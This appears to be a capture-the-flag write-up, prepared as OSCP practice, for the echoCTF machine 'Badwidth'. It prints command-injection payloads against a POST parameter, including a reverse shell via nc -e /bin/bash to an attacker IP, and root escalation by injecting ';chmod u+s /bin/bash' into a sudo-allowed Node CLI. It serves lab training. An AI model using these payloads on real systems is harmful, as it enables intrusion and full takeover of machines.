---
title: "echoCTF Badwidth Writeup: Command Injection to Root"
date: 2025-06-03
categories: ["CTF", "OSCP Prep", "echoCTF"]
tags: ["Command Injection", "Linux", "privilege escalation"]
description: "Step-by-step guide to cracking Badwidth on echoCTF with Command Injection. Perfect for OSCP prep!"
---

## Video Walkthrough

{{< youtube QZlXwNCp16k >}}

[![Watch on YouTube](https://img.shields.io/badge/Watch%20on-YouTube-red?logo=youtube)](https://www.youtube.com/watch?v=QZlXwNCp16k&t=1s)

# Badwidth

# Enumeration

## NMAP Port Scan
```bash
sudo nmap -nvv -p- 10.0.50.0 -T4 -sC -sV
```

## Output
```bash
PORT     STATE SERVICE REASON         VERSION
1337/tcp open  http    syn-ack ttl 63 Node.js Express framework
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| http-methods: 
|_  Supported Methods: POST GET HEAD
```

Analyzing the NMAP scan we can see there is 1 port open 1337.
It seems that its a webserver using `Node.js Express framework`.

![Image Description](/images/Bad1.png)

When we try to browse to it  we get some informational message or "hint" that we have to make a POST request including a parameter called "ifname" and a network interface name

```bash
└─$ curl -X POST 'http://10.0.50.0:1337/' -d 'ifname=anything'
Used interface "anything"
```

When following the format that they want, we get our input reflected back to us. 
So we can try breaking this by adding strange symbols, or fuzz it with words in order to get some sort of error back that will give us a clue what it is..

We can start with a small list first and then move to a bigger one.

```bash
ffuf -u http://10.0.50.0:1337/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt  -X POST -d 'ifname=FUZZ'
```

The output did not help at all as all the output was 200 OK. 

We can start making logical assumptions on how the code is processing our input, it is obvious that is asking for an interface name which is then getting checked with some sort of mechanism and then reflect back to us. 

So if we give it for example `ifname=test` and the code does `echo test` we can try to break out of echo and inject our own commands.

The following is perfect for what I am trying to say and is the one i have used to exploit this.

https://hackviser.com/tactics/pentesting/web/command-injection

# Exploitation

Using the resource above i created a wordlist of payloads related to command injection and i was able to get command execution using the `dollar subsitution` method.

```bash
└─$ python3 -m http.server 80

└─$ curl -X POST 'http://10.0.50.0:1337/' -d 'ifname=$(curl%20http://10.10.11.150)' 
```

![Image Description](/images/Bad2.png)

In order to get a reverse shell lets use `nc` and hope that it is installed on the target machine.

```bash
sudo nc -nvlp 80

curl -X POST 'http://10.0.50.0:1337/' -d 'ifname=$(nc%2010.10.11.150%2080%20-e%20/bin/bash)'
```

![Image Description](/images/Bad3.png)

It worked! Notice that spaces are replaced with `%20`

# Privilege Escalation

Lets upgrade our shell using python

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'

CTRL + Z

stty raw -echo;fg
(Press Enter)
(Press Enter)
(Press Enter)

export TERM=xterm
```

It seems that our users can run a binary as root!

```bash
ETSCTF@badwidth:/app$ sudo -l
Matching Defaults entries for ETSCTF on badwidth:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ETSCTF may run the following commands on badwidth:
    (ALL : ALL) NOPASSWD: /usr/local/bin/n158
```

In order to abuse this we have to understand what the program does.

```bash
ETSCTF@badwidth:/app$ cat /usr/local/bin/n158
#!/usr/bin/env node

require('../src/cli/index.js');ETSCTF
```

It seems that `n158` is a link

![Image Description](/images/Bad4.png)

Found the source code, it seems that is importing another module called `initiProject`

![Image Description](/images/Bad5.png)

Looking into it we can see it uses `shell.exec`, if we can somehow inject our input to be executed from `shell.exec` we can get root!

![Image Description](/images/Bad6.png)

Trying to understand the code it seems the `targetPath` variable is controllable by us using the `--name` flag as shown in the `index.js`  so we can trick the program into running our commands likewise:

```bash
sudo /usr/local/bin/n158 init --name ';whoami'
```

![Image Description](/images/Bad7.png)

And we have command execution as root! So now in order to get an interactive shell we can make the `/bin/bash` binary a SUID and then run `/bin/bash -p` to get root

```bash
sudo /usr/local/bin/n158 init --name ';chmod u+s /bin/bash'

CTRL + C

/bin/bash -p
```

![Image Description](/images/Bad8.png)

ROOT!